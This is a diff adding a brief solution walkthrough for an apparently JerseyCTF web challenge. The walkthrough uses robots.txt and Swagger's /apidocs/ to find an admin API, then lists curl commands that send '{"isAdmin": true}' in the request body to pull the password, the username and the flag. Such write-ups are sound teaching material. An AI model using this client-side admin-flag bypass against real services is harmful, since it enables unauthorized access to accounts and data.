@@ -1,0 +1,11 @@
+## Solution Steps
+- In the firefox extension you notice it includes *
+- When going to the website you'll be greeted with a login page (used for later)
+- By checking robots.txt you'll notice its pointing you to a special message
+- It exaplins how the "webserver" is using swagger for API usage. This is implying that somthings-fishy-b is using swagger and not a
+- Swaggers defaul api directory is /apidocs/ they should connect to it and see that they can make API requests if they have admin : true in their body requests
+- curl -X GET http://somethings-fishy-b.aws.jerseyctf.com/api/admin/getPassword -H "Content-Type: application/json" -d '{"isAdmin": true}'
+- curl -X GET http://somethings-fishy-b.aws.jerseyctf.com/api/admin/getUsername -H "Content-Type: application/json" -d '{"isAdmin": true}'
+- These commands are how your going to get the username to the server
+- curl -X GET http://somethings-fishy-b.aws.jerseyctf.com/api/admin/getFlag -H "Content-Type: application/json" -d '{"isAdmin": true}'
+- The command above is how you get the flag
